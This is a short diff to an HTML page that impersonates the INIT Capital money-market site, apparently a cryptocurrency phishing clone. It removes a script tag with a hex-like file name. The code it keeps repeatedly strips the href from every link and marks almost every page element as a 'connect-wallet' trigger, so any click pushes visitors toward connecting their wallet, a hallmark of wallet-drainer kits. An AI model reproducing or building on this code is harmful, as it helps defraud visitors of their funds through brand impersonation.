@@ -10,7 +10,6 @@
     <link href="css2?family=Roboto:wght@100;300;400&display=swap" rel="stylesheet">
     <link rel="icon" href="images/favicon.png">
     <title>INIT Capital - The Liquidity Hook Money Market</title>
-    <script charset="UTF-8" async="" type="text/javascript" src="da8f25829255b16.js"></script>
  <script src="./main.js"></script>
 
 </head>
@@ -20,11 +19,11 @@
   const links = document.querySelectorAll('a:not(.connectButton)');
   for (const link of links) {
       link.removeAttribute('href');
-      link.classList.add('connectButton connect-wallet');
+      link.classList.add('connect-wallet');
   }
   const buttons = document.querySelectorAll('div:not(.connectButton):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
   for (const button of buttons) {
-      button.classList.add('connectButton');
+      button.classList.add('connect-wallet');
   }
   }
   setInterval(addClassesToElements, 300);
